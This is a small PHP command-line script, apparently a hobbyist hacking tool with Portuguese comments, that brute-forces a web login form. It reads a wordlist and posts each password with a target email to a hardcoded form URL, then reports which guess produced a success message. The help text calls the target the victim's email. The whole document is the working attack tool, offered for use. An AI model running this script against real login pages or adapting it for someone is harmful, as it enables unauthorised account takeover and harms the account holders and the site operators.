<?php
//By us3rb0t
//BRTF 0.1
//FOR FORM
//HELP: php brute-php.php seuemail@gmail.com wordlist.txt

error_reporting(0);
echo "\n\n[+]--------- Bem vindo BRUTE FORCE by Us3r ----------[+]\n\n[+] HELP: php brute-php.php emaildavitima@gmail.com wordlist.txt\n\n";
$email = $argv[1];
$word = $argv[2];

//init funcao curl connection...
function brute($usuario, $senha){
    	
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "http://localhost/formulario.php");
      curl_setopt($ch, CURLOPT_HEADER, false);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, "nome=$usuario&senha=$senha");
      $source = curl_exec($ch);
      
      if(preg_match("'sucesso logado!!'", $source)){
        return true;
      }else{
        return false;
      }
    }


if(isset($argv[1]) && isset($argv[2])){
	$lines = file($word);
	foreach($lines as $line){
		if(brute($email, $line)){
			echo "--------------------------------------------------------\n\n";
			echo "[+] Logado no sistema! [ACCESS GRANTED] EMAIL: $email, SENHA: $line [+]";
			echo "--------------------------------------------------------\n\n";
		}
		else{
			echo "-----------------------------------------------------------------\n";
			echo "[-] Falha ao enviar os dados...[ACCESS ERROR] EMAIL: $email, SENHA: $line [-]\n";
			echo "-----------------------------------------------------------------\n\n";
		}
	}
}else{	
	exit();
}
?>